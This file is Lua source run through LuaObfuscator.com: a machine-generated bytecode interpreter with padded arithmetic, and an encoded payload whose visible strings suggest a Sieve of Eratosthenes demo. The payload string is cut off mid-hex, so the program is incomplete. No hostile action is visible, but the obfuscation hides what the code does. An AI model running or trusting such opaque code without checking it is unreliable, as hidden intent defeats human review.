--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v82=v2(v0(v30,16));if v19 then local v90=0;local v91;while true do if (v90==1) then return v91;end if (v90==0) then v91=v5(v82,v19);v19=nil;v90=1;end end else return v82;end end end);local function v20(v31,v32,v33) if v33 then local v83=0 -0 ;local v84;while true do if (v83==0) then v84=(v31/((5 -3)^(v32-(1 -0))))%((4 -2)^(((v33-((883 -263) -(555 + 64))) -(v32-((1997 -(68 + 997)) -(857 + 74)))) + (569 -(367 + (1471 -(226 + 1044)))))) ;return v84-(v84%1) ;end end else local v85=927 -(214 + 713) ;local v86;while true do if (v85==((0 -0) + 0)) then v86=2^(v32-(1 + 0)) ;return (((v31%(v86 + v86))>=v86) and (878 -(282 + (712 -(32 + 85))))) or (1637 -(1523 + 103 + 11)) ;end end end end local function v21() local v34=0 + 0 ;local v35;while true do if (v34==(2 -1)) then return v35;end if (v34==(0 + 0)) then v35=v1(v16,v18,v18);v18=v18 + ((1770 -812) -(892 + 65)) ;v34=1;end end end local function v22() local v36=0 + 0 ;local v37;local v38;while true do if (v36==(0 -0)) then v37,v38=v1(v16,v18,v18 + (352 -(87 + 263)) );v18=v18 + (182 -(67 + 113)) ;v36=1 + 0 ;end if (v36==(1 -(997 -(915 + 82)))) then return (v38 * (628 -372)) + v37 ;end end end local function v23() local v39,v40,v41,v42=v1(v16,v18,v18 + ((17 -9) -(10 -5)) );v18=v18 + 3 + 1 ;return (v42 * (22064430 -(919171 + 4368043))) + (v41 * (66723 -(1069 + 118))) + (v40 * 256) + v39 ;end local function v24() local v43=v23();local v44=v23();local v45=1 -0 ;local v46=(v20(v44,1 + 0 ,811 -(368 + (1282 -(814 + 45))) ) * ((6 -4)^(50 -(10 + 8)))) + v43 ;local v47=v20(v44,80 -59 ,31);local v48=((v20(v44,474 -(416 + 26) )==((7 -4) -2)) and  -(1 + 0)) or (1 -0) ;if (v47==0) then if (v46==(438 -(8 + 137 + 293))) then return v48 * (430 -(44 + 386)) ;else local v92=1486 -(998 + 488) ;while true do if ((0 + 0)==v92) then v47=1 + 0 ;v45=772 -(72 + 129 + 571) ;break;end end end elseif (v47==(3185 -(116 + 1022))) then return ((v46==(0 -(885 -(261 + 624)))) and (v48 * (1/0))) or (v48 * NaN) ;end return v8(v48,v47-((1067 -466) + 422) ) * (v45 + (v46/((7 -5)^(184 -132)))) ;end local function v25(v49) local v50;if  not v49 then local v87=1080 -(1020 + 60) ;while true do if (v87==(1423 -(630 + 793))) then v49=v23();if (v49==(0 -(0 -0))) then return "";end break;end end end v50=v3(v16,v18,(v18 + v49) -(4 -3) );v18=v18 + v49 ;local v51={};for v65=1 + (1747 -(760 + 987)) , #v50 do v51[v65]=v2(v1(v3(v50,v65,v65)));end return v6(v51);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v52=(function() return 780 -(162 + 618) ;end)();local v53=(function() return;end)();local v54=(function() return;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();local v58=(function() return;end)();while true do local v67=(function() return 0 + 0 ;end)();while true do if (v67~=(0 + 0)) then else if (v52== #"!") then local v99=(function() return 0;end)();local v100=(function() return;end)();while true do if (v99~=0) then else v100=(function() return 0 + 0 ;end)();while true do if ((3 -1)==v100) then v52=(function() return 2;end)();break;end if (v100==(0 -0)) then v57=(function() return v23();end)();v58=(function() return {};end)();v100=(function() return 1 + 0 ;end)();end if (v100~=(1637 -(1373 + 263))) then else for v111= #"|",v57 do local v112=(function() return 529 -(406 + 123) ;end)();local v113=(function() return;end)();local v114=(function() return;end)();local v115=(function() return;end)();while true do if (v112~=0) then else v113=(function() return 1000 -(451 + 549) ;end)();v114=(function() return nil;end)();v112=(function() return 1 + 0 ;end)();end if (v112==1) then v115=(function() return nil;end)();while true do if (v113==(1322 -(1249 + 73))) then local v195=(function() return 0 + 0 ;end)();local v196=(function() return;end)();while true do if (v195==(0 -0)) then v196=(function() return 0 -0 ;end)();while true do if (v196==(1 -0)) then v113=(function() return  #"|";end)();break;end if (v196==(0 -0)) then v114=(function() return v21();end)();v115=(function() return nil;end)();v196=(function() return 1385 -(746 + 638) ;end)();end end break;end end end if (v113~= #":") then else if (v114== #" ") then v115=(function() return v21()~=(0 + 0) ;end)();elseif (v114==(2 -0)) then v115=(function() return v24();end)();elseif (v114~= #"-19") then else v115=(function() return v25();end)();end v58[v111]=(function() return v115;end)();break;end end break;end end end v56[ #"xxx"]=(function() return v21();end)();v100=(function() return 343 -(218 + 123) ;end)();end end break;end end end if (0==v52) then local v101=(function() return 1581 -(1535 + 46) ;end)();while true do if ((0 + 0)~=v101) then else v53=(function() return {};end)();v54=(function() return {};end)();v101=(function() return 1;end)();end if (v101==(1 + 0)) then v55=(function() return {};end)();v56=(function() return {v53,v54,nil,v55};end)();v101=(function() return 1 + 1 ;end)();end if (v101==(562 -(306 + 254))) then v52=(function() return  #"<";end)();break;end end end v67=(function() return 115 -(4 + 110) ;end)();end if (v67==1) then if (v52==(586 -(57 + 527))) then for v102= #" ",v23() do local v103=(function() return 1427 -(41 + 1386) ;end)();local v104=(function() return;end)();local v105=(function() return;end)();while true do if ((0 + 0)~=v103) then else local v108=(function() return 0 -0 ;end)();local v109=(function() return;end)();while true do if (v108==(1467 -(899 + 568))) then v109=(function() return 0 + 0 ;end)();while true do if ((0 -0)==v109) then v104=(function() return 603 -(268 + 335) ;end)();v105=(function() return nil;end)();v109=(function() return 1;end)();end if (v109==1) then v103=(function() return 2 -1 ;end)();break;end end break;end end end if ((291 -(60 + 230))~=v103) then else while true do if (v104==0) then v105=(function() return v21();end)();if (v20(v105, #"]", #"}")==(166 -(122 + 44))) then local v116=(function() return 0 -0 ;end)();local v117=(function() return;end)();local v118=(function() return;end)();local v119=(function() return;end)();while true do if (v116==(9 -6)) then if (v20(v118, #"nil", #"91(")== #"~") then v119[ #"0836"]=(function() return v58[v119[ #".dev"]];end)();end v53[v102]=(function() return v119;end)();break;end if (v116==(573 -(426 + 146))) then local v176=(function() return 0 + 0 ;end)();while true do if (v176~=(1456 -(282 + 1174))) then else v119=(function() return {v22(),v22(),nil,nil};end)();if (v117==(0 -0)) then local v359=(function() return 0 + 0 ;end)();local v360=(function() return;end)();while true do if (0==v359) then v360=(function() return 0 -0 ;end)();while true do if (v360==(0 + 0)) then v119[ #"gha"]=(function() return v22();end)();v119[ #"http"]=(function() return v22();end)();break;end end break;end end elseif (v117== #"<") then v119[ #"nil"]=(function() return v23();end)();elseif (v117==(1026 -(706 + 318))) then v119[ #"19("]=(function() return v23() -((2 + 0)^16) ;end)();elseif (v117~= #"91(") then else local v409=(function() return 1257 -(1043 + 214) ;end)();local v410=(function() return;end)();while true do if (v409==(0 -0)) then v410=(function() return 1251 -(721 + 530) ;end)();while true do if (v410==(1212 -(323 + 889))) then v119[ #"19("]=(function() return v23() -(2^16) ;end)();v119[ #"0836"]=(function() return v22();end)();break;end end break;end end end v176=(function() return 2 -1 ;end)();end if (1==v176) then v116=(function() return 2;end)();break;end end end if (v116==(1273 -(945 + 326))) then if (v20(v118, #",", #":")~= #"}") then else v119[582 -(361 + 219) ]=(function() return v58[v119[4 -2 ]];end)();end if (v20(v118,2 + 0 ,1 + 1 )~= #">") then else v119[ #"asd"]=(function() return v58[v119[ #"xxx"]];end)();end v116=(function() return 703 -(271 + 429) ;end)();end if ((0 + 0)==v116) then local v177=(function() return 0;end)();while true do if (v177==(1501 -(1408 + 92))) then v116=(function() return 1087 -(461 + 625) ;end)();break;end if (v177==(1288 -(993 + 295))) then v117=(function() return v20(v105,1 + 1 , #"nil");end)();v118=(function() return v20(v105, #"asd1",1177 -(418 + 753) );end)();v177=(function() return 1 + 0 ;end)();end end end end end break;end end break;end end end for v106= #"~",v23() do v54[v106-#"{" ]=(function() return v28();end)();end return v56;end break;end end end end local function v29(v59,v60,v61) local v62=v59[1];local v63=v59[2 + 0 ];local v64=v59[853 -(20 + 830) ];return function(...) local v68=v62;local v69=v63;local v70=v64;local v71=v27;local v72=1;local v73= -(1 + 0);local v74={};local v75={...};local v76=v12("#",...) -1 ;local v77={};local v78={};for v88=0,v76 do if (v88>=v70) then v74[v88-v70 ]=v75[v88 + 1 + 0 ];else v78[v88]=v75[v88 + (739 -(542 + 196)) ];end end local v79=(v76-v70) + ((2 -1) -0) ;local v80;local v81;while true do local v89=0 + 0 ;while true do if ((v89==1) or (3288>=3541)) then if ((v81<=44) or (3557==4540)) then if (v81<=(11 + 10)) then if (v81<=(4 + 6)) then if (v81<=(10 -6)) then if (v81<=(2 -1)) then if (v81==((7724 -6173) -(1126 + 425))) then v78[v80[2]][v78[v80[408 -(118 + 287) ]]]=v80[15 -11 ];else v78[v80[1123 -(118 + 1003) ]]=v78[v80[(1 + 7) -5 ]] * v78[v80[381 -(142 + 235) ]] ;end elseif (v81<=(9 -7)) then local v123=v69[v80[10 -7 ]];local v124;local v125={};v124=v10({},{__index=function(v178,v179) local v180=v125[v179];return v180[1 + 0 ][v180[979 -(553 + 424) ]];end,__newindex=function(v181,v182,v183) local v184=v125[v182];v184[1 -0 ][v184[2 + 0 ]]=v183;end});for v186=1 + 0 ,v80[3 + 1 ] do local v187=0 + 0 ;local v188;while true do if (v187==(0 + 0 + 0)) then v72=v72 + 1 ;v188=v68[v72];v187=2 -1 ;end if ((v187==(2 -1)) or (261>1267)) then if (v188[2 -1 ]==90) then v125[v186-(1 + (0 -0)) ]={v78,v188[3]};else v125[v186-(1 + 0) ]={v60,v188[3]};end v77[ #v77 + 1 ]=v125;break;end end end v78[v80[1331 -(670 + 127 + 532) ]]=v29(v123,v124,v61);elseif (v81>(3 + 0)) then v61[v80[2 + 1 ]]=v78[v80[4 -2 ]];else v78[v80[(1178 + 26) -(373 + 829) ]]= #v78[v80[734 -((909 -(153 + 280)) + 255) ]];end elseif (v81<=((3282 -2145) -(369 + 761))) then if (v81<=(3 + 2)) then do return v78[v80[2 -0 ]];end elseif ((1272<3858) and (v81==6)) then local v201=0 -0 ;local v202;local v203;local v204;while true do if (v201==(240 -(64 + 174))) then for v363=1 + 0 ,v80[5 -(1 + 0) ] do local v364=336 -(144 + 192) ;local v365;while true do if (v364==(217 -(42 + 174))) then if (v365[1 + 0 + 0 ]==(75 + 15)) then v204[v363-(1 + 0) ]={v78,v365[8 -5 ]};else v204[v363-(1 + 0 + 0) ]={v60,v365[2 + 1 ]};end v77[ #v77 + (2 -1) ]=v204;break;end if (v364==(1933 -(350 + 215 + 1368))) then v72=v72 + (3 -2) ;v365=v68[v72];v364=1;end end end v78[v80[2]]=v29(v202,v203,v61);break;end if ((3664==3664) and ((1662 -(1477 + 184))==v201)) then v204={};v203=v10({},{__index=function(v366,v367) local v368=0 -0 ;local v369;while true do if (v368==(0 + 0)) then v369=v204[v367];return v369[857 -(564 + 292) ][v369[2 -0 ]];end end end,__newindex=function(v370,v371,v372) local v373=v204[v371];v373[2 -1 ][v373[306 -(244 + 60) ]]=v372;end});v201=2 + 0 ;end if (v201==((341 + 135) -(41 + 435))) then v202=v69[v80[1004 -(938 + 63) ]];v203=nil;v201=1 + (0 -0) ;end end elseif  not v78[v80[1127 -(936 + 189) ]] then v72=v72 + 1 + 0 ;else v72=v80[1616 -((2614 -(572 + 477)) + 48) ];end elseif ((1941>=450) and (v81<=8)) then v72=v80[2 + 1 + 0 ];elseif ((v81==9) or (4646<324)) then local v205=v80[1140 -(470 + 312 + 356) ];do return v13(v78,v205,v73);end else v78[v80[2]][v78[v80[270 -(176 + 91) ]]]=v78[v80[4]];end elseif (v81<=(39 -24)) then if ((3833==3833) and (v81<=(16 -4))) then if ((v81>(1103 -(975 + 117))) or (1240>3370)) then local v128=v80[1877 -(19 + 138 + 1718) ];v78[v128]=v78[v128](v13(v78,v128 + 1 + 0 ,v80[10 -7 ]));else local v130=v80[6 -4 ];v78[v130](v13(v78,v130 + (1019 -(697 + 321)) ,v73));end elseif (v81<=(35 -22)) then v78[v80[3 -1 ]]=v78[v80[6 -3 ]][v78[v80[2 + 2 ]]];elseif ((v81>((111 -(84 + 2)) -11)) or (2481==4682)) then local v208=v80[5 -3 ];local v209,v210=v71(v78[v208](v13(v78,v208 + (1228 -(322 + 905)) ,v80[3])));v73=(v210 + v208) -((1007 -395) -(602 + 9)) ;local v211=1189 -(449 + 740) ;for v306=v208,v73 do v211=v211 + 1 + 0 ;v78[v306]=v209[v211];end else v78[v80[(1716 -(497 + 345)) -(826 + 46) ]][v80[950 -(245 + 702) ]]=v78[v80[12 -8 ]];end elseif ((4727>=208) and (v81<=18)) then if ((280<3851) and (v81<=(6 + 10))) then if v78[v80[2]] then v72=v72 + 1 ;else v72=v80[1901 -(260 + 1638) ];end elseif (v81>(457 -(382 + 58))) then do return v78[v80[2]];end else local v215=v80[(1 + 5) -4 ];local v216,v217=v71(v78[v215](v78[v215 + 1 + 0 ]));v73=(v217 + v215) -(1 -0) ;local v218=0 -0 ;for v309=v215,v73 do local v310=1205 -(902 + 303) ;while true do if ((v310==(0 -0)) or (3007>3194)) then v218=v218 + ((1 + 1) -1) ;v78[v309]=v216[v218];break;end end end end elseif ((v81<=19) or (2136>=2946)) then v78[v80[1 + 1 ]]=v80[1693 -(1121 + (1902 -(605 + 728))) ];elseif (v81>20) then v78[v80[216 -(22 + 192) ]]=v80[686 -(483 + 200) ] + v78[v80[1467 -(1404 + 59) ]] ;else local v220=v80[5 -3 ];do return v78[v220](v13(v78,v220 + ((1 + 0) -0) ,v80[3]));end end elseif ((2165<=2521) and (v81<=((1771 -974) -(468 + 297)))) then if ((2861>661) and (v81<=26)) then if ((4525>4519) and (v81<=23)) then if (v81==22) then v78[v80[2]]=v80[3];elseif (v78[v80[(26 + 538) -(334 + 228) ]]==v80[13 -(33 -24) ]) then v72=v72 + (2 -1) ;else v72=v80[5 -2 ];end elseif ((3178>972) and (v81<=24)) then v78[v80[1 + 1 ]]=v78[v80[239 -(141 + 95) ]] + v80[4] ;elseif ((4766==4766) and (v81>25)) then local v222=v80[2 + 0 + 0 ];v78[v222]=v78[v222](v78[v222 + ((5 -3) -1) ]);else v78[v80[(4 + 0) -2 ]]= #v78[v80[1 + 2 ]];end elseif ((v81<=(79 -50)) or (2745>3128)) then if (v81<=(19 + 8)) then local v138=0;local v139;while true do if ((0 + 0)==v138) then v139=v80[2];v78[v139]=v78[v139](v13(v78,v139 + (1 -0) ,v80[3]));break;end end elseif (v81>(17 + (500 -(457 + 32)))) then v78[v80[2]]=v78[v80[(71 + 95) -(92 + 71) ]]%v78[v80[4]] ;else local v226=v80[2];do return v13(v78,v226,v73);end end elseif (v81<=(15 + 15)) then do return;end elseif (v81==(51 -(1422 -(832 + 570)))) then local v227=v80[767 -(574 + 191) ];local v228=v80[4 + 0 + 0 ];local v229=v227 + (4 -(1 + 1)) ;local v230={v78[v227](v78[v227 + 1 ],v78[v229])};for v313=850 -(254 + 595) ,v228 do v78[v229 + v313 ]=v230[v313];end local v231=v230[127 -(55 + 71) ];if v231 then v78[v229]=v231;v72=v80[(10 -7) -0 ];else v72=v72 + (1791 -(573 + 1217)) ;end else local v232=v80[5 -(2 + 1) ];local v233=v78[v232];local v234=v78[v232 + 1 + 1 ];if (v234>(0 -0)) then if (v233>v78[v232 + (940 -(714 + 225)) ]) then v72=v80[3];else v78[v232 + 3 ]=v233;end elseif ((v233<v78[v232 + (2 -1) ]) or (1144>=4606)) then v72=v80[3 -(796 -(588 + 208)) ];else v78[v232 + (8 -5) ]=v233;end end elseif (v81<=(1838 -(884 + 916))) then if ((3338>=277) and (v81<=(4 + 31))) then if ((2610>2560) and (v81<=33)) then local v140=v80[2 -0 ];local v141=v78[v140 + (808 -(118 + 688)) ];local v142=v78[v140] + v141 ;v78[v140]=v142;if (v141>(48 -(25 + 23))) then if (v142<=v78[v140 + (1 -0) + 0 ]) then local v336=1886 -(927 + 959) ;while true do if (v336==(0 -0)) then v72=v80[735 -(16 + 716) ];v78[v140 + (5 -2) ]=v142;break;end end end elseif ((v142>=v78[v140 + 1 ]) or (1194>3083)) then v72=v80[100 -(11 + 86) ];v78[v140 + (6 -3) ]=v142;end elseif (v81==(319 -(102 + 73 + 110))) then if (v80[(657 -(232 + 421)) -2 ]==v78[v80[19 -15 ]]) then v72=v72 + (1797 -(503 + 1293)) ;else v72=v80[8 -5 ];end else local v235=v80[2];do return v78[v235](v13(v78,v235 + 1 + 0 ,v80[1064 -((2699 -(1569 + 320)) + 251) ]));end end elseif (v81<=(25 + 11)) then local v144=v80[2];v78[v144]=v78[v144](v13(v78,v144 + 1 + 0 ,v73));elseif ((916>=747) and (v81>(34 + 3))) then v78[v80[2]]={};else local v237=v80[535 -(43 + 490) ];local v238={v78[v237](v78[v237 + (3 -2) ])};local v239=859 -(240 + 118 + 501) ;for v316=v237,v80[4] do local v317=0;while true do if (v317==(0 + 0)) then v239=v239 + (1 -0) ;v78[v316]=v238[v239];break;end end end end elseif ((v81<=((9 -6) + 38)) or (2444>2954)) then if ((2892<3514) and (v81<=((2388 -(316 + 289)) -(1344 + (1047 -647))))) then v78[v80[407 -(255 + 150) ]]=v78[v80[3 + 0 ]] * v78[v80[3 + 1 ]] ;elseif ((533==533) and (v81>(170 -130))) then local v240=0 -(0 + 0) ;local v241;while true do if (v240==((3192 -(666 + 787)) -(404 + 1335))) then v241=v80[2];do return v13(v78,v241,v241 + v80[409 -(183 + 223) ] );end break;end end elseif ((595<=3413) and (v78[v80[2 -0 ]]<v78[v80[4]])) then v72=v72 + 1 ;else v72=v80[2 + 1 ];end elseif ((3078>=2591) and (v81<=(16 + 26))) then v78[v80[2]]=v80[340 -(10 + 327) ]~=0 ;elseif ((3199<4030) and (v81>(30 + 13))) then if v78[v80[2]] then v72=v72 + (339 -(118 + 220)) ;else v72=v80[3];end else local v242=v80[428 -(360 + 65) ];local v243=v78[v242];for v318=v242 + 1 ,v80[4] do v243=v243   .. v78[v318] ;end v78[v80[1 + 1 ]]=v243;end elseif ((777<2078) and (v81<=67)) then if ((1696<=2282) and (v81<=(504 -(108 + 341)))) then if ((v81<=(23 + 26)) or (1761>=2462)) then if ((4551>2328) and (v81<=46)) then if (v81>(190 -145)) then v72=v80[3 + 0 ];else v78[v80[256 -(79 + 175) ]]=v29(v69[v80[1496 -(711 + (1232 -450)) ]],nil,v61);end elseif ((3825>=467) and (v81<=(89 -42))) then if (v78[v80[2 + 0 ]]==v80[473 -(270 + 199) ]) then v72=v72 + 1 ;else v72=v80[3];end elseif (v81>(16 + 32)) then v78[v80[1821 -(580 + 1239) ]]=v78[v80[8 -5 ]]%v78[v80[4 + 0 ]] ;elseif ( not v78[v80[1 + 1 ]] or (2890==557)) then v72=v72 + 1 + 0 ;else v72=v80[3];end elseif (v81<=(135 -83)) then if (v81<=50) then if (v80[2]==v78[v80[3 + 1 ]]) then v72=v72 + (1168 -((1976 -1331) + (1004 -482))) ;else v72=v80[3];end elseif (v81==51) then v78[v80[1792 -(1010 + (1679 -(503 + 396))) ]][v78[v80[3 + 0 ]]]=v78[v80[19 -15 ]];elseif ((v78[v80[5 -3 ]]<v78[v80[1840 -(1045 + (972 -(92 + 89))) ]]) or (4770==2904)) then v72=v72 + (2 -1) ;else v72=v80[4 -1 ];end elseif ((v81<=(558 -(351 + 154))) or (3903==4536)) then local v150=v80[1576 -(1281 + 293) ];v78[v150](v78[v150 + (267 -(28 + 238)) ]);elseif (v81>(120 -66)) then local v250=1559 -(1381 + 178) ;while true do if ((4093<=4845) and (v250==(0 + 0))) then v78[v80[2]]=v80[3 + 0 ]~=(0 + 0) ;v72=v72 + 1 ;break;end end else for v319=v80[6 -4 ],v80[2 + (1 -0) ] do v78[v319]=nil;end end elseif (v81<=61) then if (v81<=(528 -(196 + 185 + 89))) then if (v81<=(50 + 6)) then v78[v80[2 + 0 ]]=v60[v80[4 -1 ]];elseif (v81==(1213 -(1074 + 82))) then v78[v80[3 -1 ]]=v29(v69[v80[1787 -(214 + 1570) ]],nil,v61);else v78[v80[1457 -(990 + 276 + 189) ]]=v80[2 + 1 ]~=(0 + 0) ;end elseif (v81<=(58 + (3 -2))) then local v153=v80[2];local v154=v78[v153 + (7 -5) ];local v155=v78[v153] + v154 ;v78[v153]=v155;if (v154>(1726 -(1668 + 58))) then if (v155<=v78[v153 + ((86 + 541) -(512 + 114)) ]) then v72=v80[7 -4 ];v78[v153 + (5 -2) ]=v155;end elseif ((1569<=3647) and (v155>=v78[v153 + (3 -2) ])) then v72=v80[2 + 1 ];v78[v153 + 1 + 2 ]=v155;end elseif (v81==60) then local v253=0 + 0 ;local v254;local v255;local v256;local v257;while true do if (v253==(0 -0)) then v254=v80[1996 -(109 + 1885) ];v255,v256=v71(v78[v254](v13(v78,v254 + ((3351 -1881) -(1108 + 161 + 200)) ,v80[5 -2 ])));v253=1;end if (v253==(817 -(98 + 717))) then for v383=v254,v73 do v257=v257 + (827 -(802 + 24)) ;v78[v383]=v255[v257];end break;end if (v253==1) then v73=(v256 + v254) -(1 -0) ;v257=0;v253=2 -0 ;end end else v78[v80[1 + 1 ]][v78[v80[3 + 0 + 0 ]]]=v80[4];end elseif ((v81<=(11 + 53)) or (4046>=4927)) then if ((4623>=2787) and (v81<=(14 + 48))) then for v189=v80[2],v80[8 -5 ] do v78[v189]=nil;end elseif ((2234>=1230) and (v81>(209 -(444 -298)))) then local v260=v80[2];local v261=v80[2 + 2 ];local v262=v260 + 1 + 1 ;local v263={v78[v260](v78[v260 + 1 + 0 ],v78[v262])};for v321=1 + 0 ,v261 do v78[v262 + v321 ]=v263[v321];end local v264=v263[(179 + 1255) -(797 + 636) ];if v264 then v78[v262]=v264;v72=v80[14 -11 ];else v72=v72 + (1620 -(1427 + 192)) ;end else v78[v80[1 + 1 ]]=v60[v80[6 -3 ]];end elseif ((v81<=(59 + 6)) or (343==1786)) then do return;end elseif (v81==(30 + 36)) then v78[v80[2]]=v78[v80[329 -(192 + 134) ]]%v80[4] ;else v78[v80[1278 -(316 + 960) ]]=v61[v80[2 + 1 ]];end elseif (v81<=(61 + 17)) then if (v81<=(67 + 5)) then if (v81<=(263 -194)) then if (v81==68) then local v157=v80[(843 -290) -(83 + 468) ];v78[v157](v78[v157 + (1807 -(1202 + 604)) ]);else local v158=v80[9 -7 ];v78[v158](v13(v78,v158 + 1 ,v73));end elseif (v81<=(116 -46)) then local v159=(1244 -(485 + 759)) -0 ;local v160;while true do if ((2570>2409) and ((325 -((104 -59) + 280))==v159)) then v160=v80[2 + 0 ];v78[v160]=v78[v160](v13(v78,v160 + 1 + 0 ,v73));break;end end elseif (v81>(26 + 45)) then local v270=(1189 -(442 + 747)) + (1135 -(832 + 303)) ;local v271;local v272;local v273;local v274;while true do if (v270==(1 + 0)) then v73=(v273 + v271) -((947 -(88 + 858)) -0) ;v274=1911 -(340 + 1571) ;v270=1 + 1 ;end if (v270==(1774 -(1733 + 39))) then for v386=v271,v73 do v274=v274 + (2 -1) ;v78[v386]=v272[v274];end break;end if (v270==(1034 -(125 + 909))) then v271=v80[1950 -(1096 + 852) ];v272,v273=v71(v78[v271](v13(v78,v271 + 1 + 0 ,v73)));v270=1;end end else v78[v80[2 -(0 + 0) ]][v80[3]]=v78[v80[4 + 0 + 0 + 0 ]];end elseif (v81<=(864 -(766 + 23))) then if ((v81<=(585 -(409 + 103))) or (2609>=3234)) then local v161=v80[239 -(46 + 190) ];local v162=v78[v161];for v191=v161 + (96 -(51 + 44)) ,v80[4] do v162=v162   .. v78[v191] ;end v78[v80[1 + 1 ]]=v162;elseif (v81==((6866 -5475) -(1114 + 203))) then local v277=0;local v278;local v279;local v280;local v281;while true do if (v277==(0 -0)) then v278=v80[728 -(228 + 498) ];v279,v280=v71(v78[v278](v78[v278 + 1 ]));v277=1 + 0 ;end if (v277==2) then for v389=v278,v73 do v281=v281 + 1 + (0 -0) ;v78[v389]=v279[v281];end break;end if (v277==(664 -(174 + 489))) then v73=(v280 + v278) -((6 -4) -1) ;v281=1905 -(830 + 1075) ;v277=526 -(303 + 221) ;end end else v78[v80[2]]=v78[v80[3]];end elseif (v81<=(1345 -(231 + 1038))) then local v164=v80[(1075 -(1036 + 37)) + 0 ];local v165={v78[v164](v78[v164 + 1 ])};local v166=0 -0 ;for v192=v164,v80[(19 -9) -6 ] do v166=v166 + (2 -1) ;v78[v192]=v165[v166];end elseif (v81>(62 + 15)) then v78[v80[2]]=v78[v80[3]][v80[13 -9 ]];else local v286=v80[2];local v287,v288=v71(v78[v286](v13(v78,v286 + (2 -1) ,v73)));v73=(v288 + v286) -(1 -0) ;local v289=0;for v326=v286,v73 do local v327=0 -0 ;while true do if ((v327==(1248 -(111 + 1137))) or (3033>=4031)) then v289=v289 + (159 -(72 + 19 + 67)) ;v78[v326]=v287[v289];break;end end end end elseif ((v81<=(250 -166)) or (1401==4668)) then if ((2776>=1321) and (v81<=(21 + 60))) then if (v81<=((2082 -(641 + 839)) -(423 + 100))) then v78[v80[1 + 1 ]]=v78[v80[7 -4 ]] + v80[3 + 1 ] ;elseif (v81>(851 -(326 + 445))) then v78[v80[8 -6 ]]=v78[v80[6 -3 ]][v78[v80[4]]];else v78[v80[4 -2 ]]=v80[714 -(530 + 181) ] + v78[v80[(1798 -(910 + 3)) -(614 + 267) ]] ;end elseif (v81<=(114 -(19 + 13))) then v78[v80[(4 -2) -0 ]]=v61[v80[6 -3 ]];elseif ((v81==83) or (487>2303)) then v61[v80[8 -5 ]]=v78[v80[1 + 1 ]];else local v295=0;local v296;while true do if (v295==0) then v296=v80[(1687 -(1466 + 218)) -(1 + 0) ];v78[v296]=v78[v296](v78[v296 + (1 -0) ]);break;end end end elseif ((v81<=87) or (4503==3462)) then if (v81<=(1897 -(1293 + (1667 -(556 + 592))))) then local v170=0 -0 ;local v171;local v172;local v173;while true do if ((553<=1543) and (v170==(0 -(0 + 0)))) then v171=v80[3 -1 ];v172=v78[v171];v170=(812 -(329 + 479)) -3 ;end if ((2015==2015) and (v170==(2 -(855 -(174 + 680))))) then v173=v78[v171 + 2 ];if ((v173>(0 + 0)) or (4241<=2332)) then if ((v172>v78[v171 + 1 + 0 ]) or (2364<1157)) then v72=v80[6 -3 ];else v78[v171 + 1 + 2 ]=v172;end elseif (v172<v78[v171 + 1 ]) then v72=v80[(3 -2) + 2 ];else v78[v171 + 2 + 1 ]=v172;end break;end end elseif (v81>((2449 -1267) -(709 + 387))) then v78[v80[2]]=v80[1861 -(673 + 1185) ]~=(0 -0) ;v72=v72 + (3 -2) ;else v78[v80[2 -0 ]]=v78[v80[3 + 0 ]][v80[3 + 0 + (740 -(396 + 343)) ]];end elseif (v81<=(118 -30)) then v78[v80[1 + 1 + 0 ]]=v78[v80[5 -2 ]]%v80[7 -3 ] ;elseif (v81==((3446 -(29 + 1448)) -(446 + 1434))) then v78[v80[2]]={};else v78[v80[1285 -(1040 + 243) ]]=v78[v80[8 -5 ]];end v72=v72 + (1848 -((1948 -(135 + 1254)) + 1288)) ;break;end if (v89==(1931 -(609 + 1322))) then v80=v68[v72];v81=v80[455 -(13 + 441) ];v89=3 -2 ;end end end end;end return v29(v28(),{},v17)(...);end return v15("LOL!293Q0003063Q00737472696E6703043Q006368617203043Q00627974652Q033Q0073756203053Q0062697433322Q033Q0062697403043Q0062786F7203053Q007461626C6503063Q00636F6E63617403063Q00696E73657274026Q001C4003043Q00AFCB575803053Q007EDBB9223D026Q00184003163Q0001CE3BC83DCE6C872BC7399B2AC0388D69C3299B3D9E03043Q00E849A14C026Q00144003153Q000AA3CE2A22D9D13126AFD93D33E9CD2311AFC5393403083Q005779CAAB5C4786BE027Q0040030D3Q00E7180B27DC42BCCCC20406709903083Q00A3B76A624AB962DA026Q00F03F03343Q0023FF22410BFA254540C8185612FA254513CE6B5509FF270203FC26520CF63F470CEA6B4A09F72E0214FB225140E03F5009FD2C2Q03043Q002260934B028Q0003193Q00C6A23C4523562442CCE02E5835152659C7A43344395A2B458803083Q0036A9C05A30503545026Q000840026Q00104003053Q007072696E7403053Q00706169727303153Q0073696576655F6F665F657261746F737468656E657303023Q005F47025Q00407A40024Q00F0E4FD40026Q003440025Q00C05940023Q00406E9B5E41025Q005D3241024Q0087C6324100A34Q00267Q001252000100013Q002056000100010002001252000200013Q002056000200020003001252000300013Q002056000300030004001252000400053Q0006300004000B0001000100042E3Q000B0001001252000400063Q002056000500040007001252000600083Q002056000600060009001252000700083Q00205600070007000A002Q0600083Q000100062Q005A3Q00074Q005A3Q00014Q005A3Q00054Q005A3Q00024Q005A3Q00034Q005A3Q00064Q004B000900083Q001216000A000C3Q001216000B000D4Q001B0009000B00020010473Q000B00092Q004B000900083Q001216000A000F3Q001216000B00104Q001B0009000B00020010473Q000E00092Q004B000900083Q001216000A00123Q001216000B00134Q001B0009000B00020010473